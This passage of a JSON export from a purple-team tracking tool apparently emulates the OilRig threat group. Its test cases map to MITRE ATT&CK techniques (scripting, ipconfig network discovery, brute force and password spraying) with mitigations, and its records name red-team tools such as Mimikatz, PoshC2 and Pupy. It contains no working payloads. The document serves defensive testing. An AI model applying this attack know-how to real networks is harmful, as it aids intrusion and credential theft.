https://researchcenter.paloaltonetworks.com/2018/02/unit42-oopsie-oilrig-uses-threedollars-deliver-new-trojan/","Lee, B., Falcone, R. (2018, July 25). OilRig Targets Technology Service Provider and Government Agency with QUADAGENT. Retrieved August 9, 2018. https://researchcenter.paloaltonetworks.com/2018/07/unit42-oilrig-targets-technology-service-provider-government-agency-quadagent/","Metasploit. (n.d.). Retrieved December 4, 2014. http://www.metasploit.com","PowerSploit. (n.d.). Retrieved December 4, 2014. https://github.com/mattifestation/PowerSploit","Sardiwal, M, et al. (2017, December 7). New Targeted Attack in the Middle East by APT34, a Suspected Iranian Threat Group, Using CVE-2017-11882 Exploit. Retrieved December 20, 2017. https://www.fireeye.com/blog/threat-research/2017/12/targeted-attack-in-middle-east-by-apt34.html","Veil Framework. (n.d.). Retrieved December 4, 2014. https://www.veil-framework.com/framework/"],"mitreId":"T1064"},"blueTeam":{"successfulDetectionBehaviors":["Restrict execution of code to a virtual environment on or in transit to an endpoint system.","Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.","Turn off unused features or restrict access to scripting engines such as VBScript or scriptable administration frameworks such as PowerShell.\n\nConfigure Office security settings enable Protected View, to execute within a sandbox environment, and to block macros through Group Policy. (Citation: Microsoft Block Office Macros) Other types of virtualization and application microsegmentation may also mitigate the impact of compromise. The risks of additional exploits and weaknesses in implementation may still exist. (Citation: Ars Technica Pwn2Own 2017 VM Escape)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--ff566be3-1753-4f5d-b44d-8ee6c4a3d83c","vectrId":"ff566be3-1753-4f5d-b44d-8ee6c4a3d83c","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","templateId":"ff566be3-1753-4f5d-b44d-8ee6c4a3d83c","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"System Network Configuration Discovery","variant":"OilRig - System Network Configuration Discovery - ipconfig","objective":"Adversaries will likely look for details about the network configuration and settings of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103).\n\nAdversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n---\n[ipconfig](https://attack.mitre.org/software/S0100) is a Windows utility that can be used to find information about a system's TCP/IP, DNS, DHCP, and adapter configuration. (Citation: TechNet Ipconfig)","command":"[OilRig](https://attack.mitre.org/groups/G0049) has run <code>ipconfig /all</code> on a victim.[ipconfig](https://attack.mitre.org/software/S0100) can be used to display adapter configuration on Windows systems, including information for TCP/IP, DNS, and DHCP.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["ab7f73c5-aa6e-4309-b334-fecdecc31332"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--707399d6-ab3e-4963-9315-d9d3818cd6a0","relationship--e0301b36-c339-49c5-b257-9ece19152922","relationship--98bdcea2-1c8d-4a65-b75d-075a00d6e87c","course-of-action--684feec3-f9ba-4049-9d8f-52d52f3e0e40","tool--294e2560-bd48-44b2-9da2-833b5588ad11","relationship--b91e06c1-9546-4184-9552-ba501bf9182e","intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d"]}],"references":["Falcone, R. and Lee, B.. (2016, May 26). The OilRig Campaign: Attacks on Saudi Arabian Organizations Deliver Helminth Backdoor. Retrieved May 3, 2017. http://researchcenter.paloaltonetworks.com/2016/05/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/","Grunzweig, J. and Falcone, R.. (2016, October 4). OilRig Malware Campaign Updates Toolset and Expands Targets. Retrieved May 3, 2017. http://researchcenter.paloaltonetworks.com/2016/10/unit42-oilrig-malware-campaign-updates-toolset-and-expands-targets/","Microsoft. (n.d.). Ipconfig. Retrieved April 17, 2016. https://technet.microsoft.com/en-us/library/bb490921.aspx"],"mitreId":"T1016"},"blueTeam":{"successfulDetectionBehaviors":["Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about a system's network configuration, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--ffd0767e-9c9f-4da3-bfca-a2517e34cec5","vectrId":"ffd0767e-9c9f-4da3-bfca-a2517e34cec5","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"01d77cc8-b129-413b-adf5-850cebc4ae79","templateId":"ffd0767e-9c9f-4da3-bfca-a2517e34cec5","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Brute Force","variant":"OilRig - Brute Force","objective":"Adversaries may use brute force techniques to attempt access to accounts when passwords are unknown or when password hashes are obtained.\n\n[Credential Dumping](https://attack.mitre.org/techniques/T1003) is used to obtain password hashes, this may only get an adversary so far when [Pass the Hash](https://attack.mitre.org/techniques/T1075) is not an option. Techniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network. (Citation: Wikipedia Password cracking)\n\nAdversaries may attempt to brute force logins without knowledge of passwords or hashes during an operation either with zero knowledge or by attempting a list of known or possible passwords. This is a riskier option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nA related technique called password spraying uses one password (e.g. 'Password01'), or a small list of passwords, that matches the complexity policy of the domain and may be a commonly used password. Logins are attempted with that password and many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. (Citation: BlackHillsInfosec Password Spraying)\n\nTypically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)\n\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.","command":"[OilRig](https://attack.mitre.org/groups/G0049) has used brute force techniques to obtain credentials.Use multi-factor authentication. Where possible, also enable multi-factor authentication on externally facing services.\n---\nSet account lockout policies after a certain number of failed login attempts to prevent passwords from being guessed. Too strict a policy may create a denial of service condition and render environments un-usable, with all accounts used in the brute force being locked-out.\n---\nRefer to NIST guidelines when creating password policies.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--a93494bb-4b80-4ea1-8695-3236a49916fd","relationship--7f7226d7-6980-402a-b10e-e81b50c7ee09","relationship--cb87a0ce-0976-49e5-8e9c-2c908a24b30f","course-of-action--b045d015-6bed-4490-bd38-56b41ece59a0","relationship--c1a6c86e-5d5d-4cf1-845e-1660d9c19baf","course-of-action--f9f9e6ef-bc0a-41ad-ba11-0924e5e84c4c","relationship--cade3e14-aab4-4297-b77d-019d3ee0ccef","course-of-action--4a99fecc-680b-448e-8fe7-8144c60d272c","relationship--d1f67e5c-72c6-4e26-91d4-bc8593e61774","course-of-action--90c218c3-fbf8-4830-98a7-e8cfb7eaa485","intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d"]}],"references":["Cylance. (2014, December). Operation Cleaver. Retrieved September 14, 2017. https://www.cylance.com/content/dam/cylance/pages/operation-cleaver/Cylance_Operation_Cleaver_Report.pdf","Davis, S. and Caban, D. (2017, December 19). APT34 - New Targeted Attack in the Middle East. Retrieved December 20, 2017. https://www.brighttalk.com/webcast/10703/296317/apt34-new-targeted-attack-in-the-middle-east","Grassi, P., et al. (2017, December 1). SP 800-63-3, Digital Identity Guidelines. Retrieved January 16, 2019. https://pages.nist.gov/800-63-3/sp800-63b.html","Metcalf, S. (2018, May 6). Trimarc Research: Detecting Password Spraying with Security Event Auditing. Retrieved January 16, 2019. https://www.trimarcsecurity.com/single-post/2018/05/06/Trimarc-Research-Detecting-Password-Spraying-with-Security-Event-Auditing","Thyer, J. (2015, October 30). Password Spraying & Other Fun with RPCCLIENT. Retrieved April 25, 2017. http://www.blackhillsinfosec.com/?p=4645","US-CERT. (2018, March 27). TA18-068A Brute Force Attacks Conducted by Cyber Actors. Retrieved October 2, 2019. https://www.us-cert.gov/ncas/alerts/TA18-086A","Wikipedia. (n.d.). Password cracking. Retrieved December 23, 2015. https://en.wikipedia.org/wiki/Password_cracking"],"mitreId":"T1110"},"blueTeam":{"successfulDetectionBehaviors":["Use two or more pieces of evidence to authenticate to a system; such as username and password in addition to a token from a physical smart card or token generator.","Configure features related to account use like login attempt lockouts, specific login times, etc.","Set account lockout policies after a certain number of failed login attempts to prevent passwords from being guessed. \nToo strict a policy can create a denial of service condition and render environments un-usable, with all accounts being locked-out permanently. Use multifactor authentication. Follow best practices for mitigating access to [Valid Accounts](https://attack.mitre.org/techniques/T1078)\n\nRefer to NIST guidelines when creating passwords.(Citation: NIST 800-63-3)\n\nWhere possible, also enable multi factor authentication on external facing services.","Set and enforce secure password policies for accounts."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-redproduct","id":"x-vectr-io-redproduct--001ff422-5ce9-9680-42ab-fe0247831238","vectrId":"001ff422-5ce9-9680-42ab-fe0247831238","offset":0,"createTime":null,"updateTime":1.548449283724E12,"name":"FTP","version":"tbd","description":"Standard FTP Client (Filezilla, WinSCP, etc.)","applicablePhaseIds":["24291ae1-2110-4f4c-8b0d-7b8c8676ed5d","1b7512d2-ec31-4fab-af57-4fec213b0ae8","bb51fb2c-dc2f-40dc-9e1b-f3f33f7d5675","cc4c7093-0b33-4cf6-95a7-eff607c86c79","549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","ecef1af6-4ab3-4501-a94c-9d72bd72f124","866d6b69-3f03-4c88-bf51-679a0e4cab74","f9271ade-7cab-4cba-9a3e-6f722482bb80","7ff406ce-85e1-4732-ae3d-8ec478023d6f","48dc2baf-1d23-46cb-bb6f-ef36bc0db493","0d594ca4-4491-4b70-9227-c9e0589dfcca","ac8d65ca-f067-4213-9383-ac34dc8f236c","b01606fb-b984-4415-ac33-456e12fecea9","47da3f56-d9fc-4735-a343-b57b4ad8eca5","01d77cc8-b129-413b-adf5-850cebc4ae79","772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","769c1759-3db5-486d-918a-67fbadee4787","2afb7c56-ea1b-47fc-b96c-1579dd049690","69a00d73-ea90-401c-8ef0-9fcd1785d0b4"],"expectedDetectionLayerIds":[],"primarySecondary":"Primary","vendorId":"d9c391ce-45e2-426a-9851-c2f2ee8e052c","analysisEngine":false,"color":"#9E9E9E","tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-redproduct","id":"x-vectr-io-redproduct--2b8ddd46-e0f0-4db7-bf0d-ba1854dbea36","vectrId":"2b8ddd46-e0f0-4db7-bf0d-ba1854dbea36","offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"name":"certutil","version":"n/a","description":"[certutil](https://attack.mitre.org/software/S0160) is a command-line utility that can be used to obtain certificate authority information and configure Certificate Services. (Citation: TechNet Certutil)","applicablePhaseIds":["24291ae1-2110-4f4c-8b0d-7b8c8676ed5d","1b7512d2-ec31-4fab-af57-4fec213b0ae8","bb51fb2c-dc2f-40dc-9e1b-f3f33f7d5675","cc4c7093-0b33-4cf6-95a7-eff607c86c79","549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","ecef1af6-4ab3-4501-a94c-9d72bd72f124","5f453ab7-7447-4d48-85bb-c092111b10a5","866d6b69-3f03-4c88-bf51-679a0e4cab74","f9271ade-7cab-4cba-9a3e-6f722482bb80","7ff406ce-85e1-4732-ae3d-8ec478023d6f","48dc2baf-1d23-46cb-bb6f-ef36bc0db493","0d594ca4-4491-4b70-9227-c9e0589dfcca","ac8d65ca-f067-4213-9383-ac34dc8f236c","b01606fb-b984-4415-ac33-456e12fecea9","47da3f56-d9fc-4735-a343-b57b4ad8eca5","01d77cc8-b129-413b-adf5-850cebc4ae79","772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","769c1759-3db5-486d-918a-67fbadee4787","2afb7c56-ea1b-47fc-b96c-1579dd049690","69a00d73-ea90-401c-8ef0-9fcd1785d0b4"],"expectedDetectionLayerIds":["4a35ec87-16cf-4c46-b083-f25df01e02f9","a95575f5-124e-4bf4-8fe3-c19fc3506b8f","3e014b51-0a62-44ad-86a7-9f27a3128196","45719f74-ccb0-41a4-8fdf-fef547c3ce3d","765c22af-e010-4b4d-9ba5-86e1ae6c916d","35edd968-3417-4bb0-a3a8-43a3e710b4fa","9309d503-0861-4923-8a9a-f4749113e9e7","d34d1ad7-8ca5-41e0-bbfa-7a2b420f0d59","a0e7b7dc-aba2-4027-9357-89caed086b5d","ca2faec1-7837-45ec-b6bb-64e1705a0014","4fc1d7cf-5d2e-4446-8eef-6ed36df986d5","187fbad5-3728-42bd-bedc-42098c7eb167","6d4984f9-9d79-4f21-a495-dd6fcd0ee363","d2d7d787-e8ce-47a5-8b96-14fb6d72cfe5","0eaac669-7d11-4397-8011-a9cce6e577be","9d2569b3-ad9e-4496-a81a-47a0e8ef57b3","61d3f883-72cd-4c57-8d84-545a5f34ac5c","860cc9bc-4da2-4698-889b-e96cca9e4bf3","c6b0def0-a115-4677-85fa-a7f08359a5e2","d37784d0-0083-45b7-b332-d5eb9ee95ca6","54c70ef6-1e4a-4613-a99d-692230cb557a","6490f8d2-6bc1-4721-86c3-6244ac9f622e","2ff8b970-9742-4e81-9dd1-abe28518bb0b","9b70bae4-10c6-46fe-ad6f-e33bc0e6758f","512f7c46-b791-49bc-8afb-73d172bcc120","8cf5dd9d-1745-4f3c-861b-8548abf4080c","9e008dd9-fe16-4ac8-8a6f-e537f60238f1","0689aff6-d98e-4776-b36b-056f1a7645b2"],"primarySecondary":"Primary","vendorId":"058e6f79-4b72-4905-83d0-ac55f5889fc6","analysisEngine":false,"color":"#9E9E9E","tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-redproduct","id":"x-vectr-io-redproduct--3883d65a-3ad2-4111-92fa-19a5d39a119d","vectrId":"3883d65a-3ad2-4111-92fa-19a5d39a119d","offset":0,"createTime":1.466260163E12,"updateTime":1.548447625481E12,"name":"Mimikatz","version":"tbd","description":"Mimikatz","applicablePhaseIds":["24291ae1-2110-4f4c-8b0d-7b8c8676ed5d","1b7512d2-ec31-4fab-af57-4fec213b0ae8","bb51fb2c-dc2f-40dc-9e1b-f3f33f7d5675","cc4c7093-0b33-4cf6-95a7-eff607c86c79","549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","ecef1af6-4ab3-4501-a94c-9d72bd72f124","866d6b69-3f03-4c88-bf51-679a0e4cab74","f9271ade-7cab-4cba-9a3e-6f722482bb80","7ff406ce-85e1-4732-ae3d-8ec478023d6f","48dc2baf-1d23-46cb-bb6f-ef36bc0db493","0d594ca4-4491-4b70-9227-c9e0589dfcca","ac8d65ca-f067-4213-9383-ac34dc8f236c","b01606fb-b984-4415-ac33-456e12fecea9","47da3f56-d9fc-4735-a343-b57b4ad8eca5","01d77cc8-b129-413b-adf5-850cebc4ae79","772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","769c1759-3db5-486d-918a-67fbadee4787","2afb7c56-ea1b-47fc-b96c-1579dd049690","69a00d73-ea90-401c-8ef0-9fcd1785d0b4"],"expectedDetectionLayerIds":[],"primarySecondary":"Primary","vendorId":"1e0579eb-d4eb-4c7b-8bc7-927a5e303cac","analysisEngine":false,"color":"#9E9E9E","tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-redproduct","id":"x-vectr-io-redproduct--4134a48a-87f8-6a59-c5f0-e238c3c8615e","vectrId":"4134a48a-87f8-6a59-c5f0-e238c3c8615e","offset":0,"createTime":null,"updateTime":1.548448027111E12,"name":"Manual Techniques","version":"Manual Techniques","description":"Manual Techniques","applicablePhaseIds":["24291ae1-2110-4f4c-8b0d-7b8c8676ed5d","1b7512d2-ec31-4fab-af57-4fec213b0ae8","bb51fb2c-dc2f-40dc-9e1b-f3f33f7d5675","cc4c7093-0b33-4cf6-95a7-eff607c86c79","549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","ecef1af6-4ab3-4501-a94c-9d72bd72f124","866d6b69-3f03-4c88-bf51-679a0e4cab74","f9271ade-7cab-4cba-9a3e-6f722482bb80","7ff406ce-85e1-4732-ae3d-8ec478023d6f","48dc2baf-1d23-46cb-bb6f-ef36bc0db493","0d594ca4-4491-4b70-9227-c9e0589dfcca","ac8d65ca-f067-4213-9383-ac34dc8f236c","b01606fb-b984-4415-ac33-456e12fecea9","47da3f56-d9fc-4735-a343-b57b4ad8eca5","01d77cc8-b129-413b-adf5-850cebc4ae79","772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","769c1759-3db5-486d-918a-67fbadee4787","2afb7c56-ea1b-47fc-b96c-1579dd049690","69a00d73-ea90-401c-8ef0-9fcd1785d0b4"],"expectedDetectionLayerIds":[],"primarySecondary":"Primary","vendorId":"013894b0-22b0-49be-923e-7c66fe5184f1","analysisEngine":false,"color":"#9E9E9E","tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-redproduct","id":"x-vectr-io-redproduct--513d0a31-4d49-4006-8591-c5b67477faf6","vectrId":"513d0a31-4d49-4006-8591-c5b67477faf6","offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"name":"Reg","version":"n/a","description":"[Reg](https://attack.mitre.org/software/S0075) is a Windows utility used to interact with the Windows Registry. It can be used at the command-line interface to query, add, modify, and remove information. (Citation: Microsoft Reg)\n\nUtilities such as [Reg](https://attack.mitre.org/software/S0075) are known to be used by persistent threats. (Citation: Windows Commands JPCERT)","applicablePhaseIds":["24291ae1-2110-4f4c-8b0d-7b8c8676ed5d","1b7512d2-ec31-4fab-af57-4fec213b0ae8","bb51fb2c-dc2f-40dc-9e1b-f3f33f7d5675","cc4c7093-0b33-4cf6-95a7-eff607c86c79","549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","ecef1af6-4ab3-4501-a94c-9d72bd72f124","5f453ab7-7447-4d48-85bb-c092111b10a5","866d6b69-3f03-4c88-bf51-679a0e4cab74","f9271ade-7cab-4cba-9a3e-6f722482bb80","7ff406ce-85e1-4732-ae3d-8ec478023d6f","48dc2baf-1d23-46cb-bb6f-ef36bc0db493","0d594ca4-4491-4b70-9227-c9e0589dfcca","ac8d65ca-f067-4213-9383-ac34dc8f236c","b01606fb-b984-4415-ac33-456e12fecea9","47da3f56-d9fc-4735-a343-b57b4ad8eca5","01d77cc8-b129-413b-adf5-850cebc4ae79","772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","769c1759-3db5-486d-918a-67fbadee4787","2afb7c56-ea1b-47fc-b96c-1579dd049690","69a00d73-ea90-401c-8ef0-9fcd1785d0b4"],"expectedDetectionLayerIds":["4a35ec87-16cf-4c46-b083-f25df01e02f9","a95575f5-124e-4bf4-8fe3-c19fc3506b8f","3e014b51-0a62-44ad-86a7-9f27a3128196","45719f74-ccb0-41a4-8fdf-fef547c3ce3d","765c22af-e010-4b4d-9ba5-86e1ae6c916d","35edd968-3417-4bb0-a3a8-43a3e710b4fa","9309d503-0861-4923-8a9a-f4749113e9e7","d34d1ad7-8ca5-41e0-bbfa-7a2b420f0d59","a0e7b7dc-aba2-4027-9357-89caed086b5d","ca2faec1-7837-45ec-b6bb-64e1705a0014","4fc1d7cf-5d2e-4446-8eef-6ed36df986d5","187fbad5-3728-42bd-bedc-42098c7eb167","6d4984f9-9d79-4f21-a495-dd6fcd0ee363","d2d7d787-e8ce-47a5-8b96-14fb6d72cfe5","0eaac669-7d11-4397-8011-a9cce6e577be","9d2569b3-ad9e-4496-a81a-47a0e8ef57b3","61d3f883-72cd-4c57-8d84-545a5f34ac5c","860cc9bc-4da2-4698-889b-e96cca9e4bf3","c6b0def0-a115-4677-85fa-a7f08359a5e2","d37784d0-0083-45b7-b332-d5eb9ee95ca6","54c70ef6-1e4a-4613-a99d-692230cb557a","6490f8d2-6bc1-4721-86c3-6244ac9f622e","2ff8b970-9742-4e81-9dd1-abe28518bb0b","9b70bae4-10c6-46fe-ad6f-e33bc0e6758f","512f7c46-b791-49bc-8afb-73d172bcc120","8cf5dd9d-1745-4f3c-861b-8548abf4080c","9e008dd9-fe16-4ac8-8a6f-e537f60238f1","0689aff6-d98e-4776-b36b-056f1a7645b2"],"primarySecondary":"Primary","vendorId":"058e6f79-4b72-4905-83d0-ac55f5889fc6","analysisEngine":false,"color":"#9E9E9E","tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-redproduct","id":"x-vectr-io-redproduct--5a7984d4-d134-4fbd-ab45-5dfa73bfd16b","vectrId":"5a7984d4-d134-4fbd-ab45-5dfa73bfd16b","offset":0,"createTime":1.569010318167E12,"updateTime":1.569010318167E12,"name":"Pupy","version":"n/a","description":"[Pupy](https://attack.mitre.org/software/S0192) is an open source, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool. (Citation: GitHub Pupy) It is written in Python and can be generated as a payload in several different ways (Windows exe, Python file, PowerShell oneliner/file, Linux elf, APK, Rubber Ducky, etc.). (Citation: GitHub Pupy) [Pupy](https://attack.mitre.org/software/S0192) is publicly available on GitHub. (Citation: GitHub Pupy)","applicablePhaseIds":["24291ae1-2110-4f4c-8b0d-7b8c8676ed5d","1b7512d2-ec31-4fab-af57-4fec213b0ae8","bb51fb2c-dc2f-40dc-9e1b-f3f33f7d5675","cc4c7093-0b33-4cf6-95a7-eff607c86c79","549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","ecef1af6-4ab3-4501-a94c-9d72bd72f124","5f453ab7-7447-4d48-85bb-c092111b10a5","866d6b69-3f03-4c88-bf51-679a0e4cab74","f9271ade-7cab-4cba-9a3e-6f722482bb80","7ff406ce-85e1-4732-ae3d-8ec478023d6f","48dc2baf-1d23-46cb-bb6f-ef36bc0db493","0d594ca4-4491-4b70-9227-c9e0589dfcca","ac8d65ca-f067-4213-9383-ac34dc8f236c","b01606fb-b984-4415-ac33-456e12fecea9","47da3f56-d9fc-4735-a343-b57b4ad8eca5","01d77cc8-b129-413b-adf5-850cebc4ae79","772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","769c1759-3db5-486d-918a-67fbadee4787","2afb7c56-ea1b-47fc-b96c-1579dd049690","69a00d73-ea90-401c-8ef0-9fcd1785d0b4"],"expectedDetectionLayerIds":["4a35ec87-16cf-4c46-b083-f25df01e02f9","a95575f5-124e-4bf4-8fe3-c19fc3506b8f","3e014b51-0a62-44ad-86a7-9f27a3128196","45719f74-ccb0-41a4-8fdf-fef547c3ce3d","765c22af-e010-4b4d-9ba5-86e1ae6c916d","35edd968-3417-4bb0-a3a8-43a3e710b4fa","9309d503-0861-4923-8a9a-f4749113e9e7","d34d1ad7-8ca5-41e0-bbfa-7a2b420f0d59","a0e7b7dc-aba2-4027-9357-89caed086b5d","ca2faec1-7837-45ec-b6bb-64e1705a0014","4fc1d7cf-5d2e-4446-8eef-6ed36df986d5","187fbad5-3728-42bd-bedc-42098c7eb167","6d4984f9-9d79-4f21-a495-dd6fcd0ee363","d2d7d787-e8ce-47a5-8b96-14fb6d72cfe5","0eaac669-7d11-4397-8011-a9cce6e577be","9d2569b3-ad9e-4496-a81a-47a0e8ef57b3","61d3f883-72cd-4c57-8d84-545a5f34ac5c","860cc9bc-4da2-4698-889b-e96cca9e4bf3","c6b0def0-a115-4677-85fa-a7f08359a5e2","d37784d0-0083-45b7-b332-d5eb9ee95ca6","54c70ef6-1e4a-4613-a99d-692230cb557a","6490f8d2-6bc1-4721-86c3-6244ac9f622e","2ff8b970-9742-4e81-9dd1-abe28518bb0b","9b70bae4-10c6-46fe-ad6f-e33bc0e6758f","512f7c46-b791-49bc-8afb-73d172bcc120","8cf5dd9d-1745-4f3c-861b-8548abf4080c","9e008dd9-fe16-4ac8-8a6f-e537f60238f1","0689aff6-d98e-4776-b36b-056f1a7645b2"],"primarySecondary":"Primary","vendorId":"058e6f79-4b72-4905-83d0-ac55f5889fc6","analysisEngine":false,"color":"#9E9E9E","tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-redproduct","id":"x-vectr-io-redproduct--740b39a7-cf4c-4c2d-acf1-585754a5b04f","vectrId":"740b39a7-cf4c-4c2d-acf1-585754a5b04f","offset":0,"createTime":1.569010318167E12,"updateTime":1.569010318167E12,"name":"PoshC2","version":"n/a","description":"[PoshC2](https://attack.mitre.org/software/S0378) is an open source remote administration and post-exploitation framework that is publicly available on GitHub. The server-side components of the tool are primarily written in Python, while the implants are written in [PowerShell](https://attack.mitre.org/techniques/T1086). Although [PoshC2](https://attack.mitre.org/software/S0378) is primarily focused on Windows implantation, it does contain a basic Python dropper for Linux/macOS.(Citation: GitHub PoshC2)","applicablePhaseIds":["24291ae1-2110-4f4c-8b0d-7b8c8676ed5d","1b7512d2-ec31-4fab-af57-4fec213b0ae8","bb51fb2c-dc2f-40dc-9e1b-f3f33f7d5675","cc4c7093-0b33-4cf6-95a7-eff607c86c79","549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","ecef1af6-4ab3-4501-a94c-9d72bd72f124","5f453ab7-7447-4d48-85bb-c092111b10a5","866d6b69-3f03-4c88-bf51-679a0e4cab74","f9271ade-7cab-4cba-9a3e-6f722482bb80","7ff406ce-85e1-4732-ae3d-8ec478023d6f","48dc2baf-1d23-46cb-bb6f-ef36bc0db493","0d594ca4-4491-4b70-9227-c9e0589dfcca","ac8d65ca-f067-4213-9383-ac34dc8f236c","b01606fb-b984-4415-ac33-456e12fecea9","47da3f56-d9fc-4735-a343-b57b4ad8eca5","01d77cc8-b129-413b-adf5-850cebc4ae79","772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","769c1759-3db5-486d-918a-67fbadee4787","2afb7c56-ea1b-47fc-b96c-1579dd049690","69a00d73-ea90-401c-8ef0-9fcd1785d0b4"],"expectedDetectionLayerIds":["4a35ec87-16cf-4c46-b083-f25df01e02f9","a95575f5-124e-4bf4-8fe3-c19fc3506b8f","3e014b51